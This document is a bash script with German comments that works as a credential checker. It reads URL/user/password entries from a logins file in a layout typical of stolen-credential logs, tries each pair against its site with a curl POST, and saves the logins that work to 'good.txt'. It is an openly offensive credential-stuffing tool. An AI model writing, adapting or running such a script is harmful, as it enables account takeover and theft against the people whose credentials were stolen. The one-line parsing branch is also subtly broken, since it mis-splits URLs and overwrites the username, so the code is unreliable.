#!/bin/bash

input_file="logins.txt"
good_file="good.txt"
output_file="output.txt"

# Leeren der Ausgabedateien
> "$good_file"
> "$output_file"

while IFS= read -r line
do
    if [[ $line == *"URL:"* ]]; then
        # Parsen des 3er-Formats
        url="${line#URL: }"
        read -r line1
        username="${line1#USER: }"
        read -r line2
        password="${line2#PASS: }"
    else
        # Parsen des Einzeilenformats
        IFS=' ' read -r id urlpart userpass <<< "$line"
        IFS=':' read -r url username password <<< "$urlpart"
        username="${userpass}"
        password="${password}"
    fi

    # Senden der POST-Anfrage mit curl
    response=$(curl -s -X POST -d "username=${username}&password=${password}" "$url")

    # Überprüfen, ob die Anmeldung erfolgreich war
    if [[ $response == *"successful_login_identifier"* ]]; then
        echo "Login erfolgreich für ${url}" | tee -a "$output_file"
        echo -e "URL: $url\nUSER: $username\nPASS: $password" >> "$good_file"
    else
        echo "Login fehlgeschlagen für ${url}" | tee -a "$output_file"
    fi

done < "$input_file"